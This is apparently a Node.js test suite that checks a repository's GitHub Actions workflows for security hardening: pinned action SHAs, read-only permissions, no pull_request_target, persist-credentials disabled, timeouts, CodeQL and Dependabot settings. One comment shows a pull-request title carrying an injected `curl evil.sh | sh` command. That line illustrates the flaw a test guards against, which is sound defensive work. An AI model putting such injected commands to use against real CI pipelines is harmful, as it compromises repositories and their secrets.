'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const WORKFLOW_DIR = path.join(__dirname, '..', '.github', 'workflows');

function workflows() {
  return fs.readdirSync(WORKFLOW_DIR)
    .filter(f => f.endsWith('.yml') || f.endsWith('.yaml'))
    .map(f => ({ name: f, body: fs.readFileSync(path.join(WORKFLOW_DIR, f), 'utf8') }));
}

test('there is at least one workflow to check', () => {
  assert.ok(workflows().length > 0);
});

test('every third-party action is pinned to a full commit SHA', () => {
  // A tag is mutable. Whoever controls the action repository can repoint v4 at
  // new code that then runs with this workflow's token.
  const offenders = [];
  for (const { name, body } of workflows()) {
    for (const m of body.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)/gm)) {
      const ref = m[1];
      if (ref.startsWith('./')) continue;               // local composite action
      const at = ref.lastIndexOf('@');
      const version = at === -1 ? '' : ref.slice(at + 1);
      if (!/^[0-9a-f]{40}$/.test(version)) offenders.push(`${name}: ${ref}`);
    }
  }
  assert.deepEqual(offenders, [], 'pin these to a 40-character commit SHA');
});

test('every pinned action carries a human-readable version comment', () => {
  const offenders = [];
  for (const { name, body } of workflows()) {
    for (const line of body.split('\n')) {
      if (!/^\s*(?:-\s*)?uses:\s*\S+@[0-9a-f]{40}/.test(line)) continue;
      if (!/#\s*v?\d/.test(line)) offenders.push(`${name}: ${line.trim()}`);
    }
  }
  assert.deepEqual(offenders, [],
    'append "# vX.Y.Z" so a reader can tell what the SHA points at');
});

test('every workflow declares an explicit permissions block', () => {
  // Without one, the job inherits the repository default, which may be
  // read-write on every scope.
  for (const { name, body } of workflows()) {
    assert.match(body, /^permissions:/m, `${name} must set top-level permissions`);
  }
});

test('no workflow grants write access it does not need', () => {
  for (const { name, body } of workflows()) {
    const topLevel = /^permissions:\n((?:[ \t]+.*\n)+)/m.exec(body);
    assert.ok(topLevel, `${name} must set top-level permissions`);
    assert.match(topLevel[1], /contents:\s*read/,
      `${name} top-level permissions should be contents: read`);
    assert.doesNotMatch(topLevel[1], /contents:\s*write/,
      `${name} must not grant contents: write at the top level`);
  }
});

test('no workflow uses pull_request_target', () => {
  // pull_request_target runs with the base repository's secrets while checking
  // out a fork's code, which is how untrusted contributions gain a write token.
  for (const { name, body } of workflows()) {
    assert.doesNotMatch(body, /pull_request_target/, `${name} must not use pull_request_target`);
  }
});

test('no run step interpolates attacker-controlled event data', () => {
  // ${{ github.event.pull_request.title }} and friends are pasted into the shell
  // verbatim, so a PR titled `"; curl evil.sh | sh #` executes.
  const dangerous = /\$\{\{\s*github\.(event|head_ref)[^}]*\}\}/g;
  const offenders = [];
  for (const { name, body } of workflows()) {
    for (const m of body.matchAll(dangerous)) {
      // github.event.repository and github.event_name are not attacker-supplied.
      if (/github\.event_name|github\.event\.repository/.test(m[0])) continue;
      offenders.push(`${name}: ${m[0]}`);
    }
  }
  assert.deepEqual(offenders, [], 'pass these through env: instead of inlining them');
});

test('checkout does not leave credentials in the git config', () => {
  for (const { name, body } of workflows()) {
    if (!/uses:\s*actions\/checkout@/.test(body)) continue;
    assert.match(body, /persist-credentials:\s*false/,
      `${name} should set persist-credentials: false`);
  }
});

test('every job has a timeout so a hung run cannot burn minutes indefinitely', () => {
  for (const { name, body } of workflows()) {
    const jobs = (body.match(/^\s{4}runs-on:/gm) || []).length;
    const timeouts = (body.match(/^\s{4}timeout-minutes:/gm) || []).length;
    assert.equal(timeouts, jobs, `${name}: ${jobs} job(s) but ${timeouts} timeout(s)`);
  }
});

test('the CodeQL workflow runs the extended security queries', () => {
  const codeql = workflows().find(w => /codeql/i.test(w.name));
  assert.ok(codeql, 'a CodeQL workflow exists');
  assert.match(codeql.body, /languages:\s*javascript-typescript/);
  assert.match(codeql.body, /queries:\s*security-extended/,
    'the default pack alone would not flag input reaching an innerHTML sink');
  assert.match(codeql.body, /security-events:\s*write/,
    'required to upload results to the security tab');
});

test('dependabot keeps the action pins current', () => {
  const config = fs.readFileSync(
    path.join(__dirname, '..', '.github', 'dependabot.yml'), 'utf8'
  );
  assert.match(config, /package-ecosystem:\s*github-actions/,
    'pinned SHAs are only safe if something updates them');
});
